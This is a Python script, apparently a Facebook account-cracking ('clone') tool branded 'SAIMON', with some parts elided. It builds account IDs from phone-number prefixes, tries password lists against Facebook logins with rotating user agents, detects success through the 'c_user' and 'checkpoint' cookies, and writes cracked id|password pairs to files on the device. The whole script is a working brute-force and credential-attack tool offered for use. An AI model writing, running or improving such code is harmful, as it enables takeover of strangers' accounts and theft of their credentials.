...
for x in range(10):
	...
	i='; U; SAIMONa/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
...
:......:::..:::::..::....::..:::::..:::.......:::..::::..::
\033[1;33m═══════════════════════════════════════════════════════
\033[1;32m[+]     Owner    : ꧁SAIMON᭄➼
\033[1;32m[+]     Facebook : ꧁SAIMON᭄➼
\033[1;31m[+]     Version  : 1.0
\033[1;32m[+]    Whatsup : 01737566013
\033[1;32m[+]     Tol Typ  : \x1b[91;1m FREE
\033[1;99m════════════════════════════════════════════""")
def linex():
	print('\033[1;96m════════════════════════════════════════════')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[32;99m[✓] ꧁SAIMON᭄➼  VERSION :\x1b[1;99m1.0  0')
			print('[✓]Tol Typ : \x1b[91;1m Free')
			linex()
			print('\033[33;1m''[1] Crack File Clone\n[2] Crack Random Clone\n[0] Exit')
			linex()
			xd=input('\x1b[30;1m[*] Choose an option: ')
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				...
				os.system(f'xdg-open https://facebook.com/https://facebook.com/groups/1174580753310056//');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[꧁SAIMON᭄➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[꧁SAIMON᭄➼-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/SAIMON-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XIYAD:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[꧁SAIMON᭄➼-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/SAIMON-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[꧁SAIMON᭄➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[꧁SAIMON᭄➼-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[꧁SAIMON᭄➼-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/SAIMON-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def random_number3():
	...
	os.system('clear')
	print(logo)
	print('\x1b[92;1m[√] EXAMPLE :017,019,018,016.ETC')
	linex()
	kode = input('[+]\x1b[97;1m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97m꧁SAIMON᭄➼\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[꧁SAIMON᭄➼-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[꧁SAIMON᭄➼-OK] '+uid+' | '+ps+'\33[0;97m')
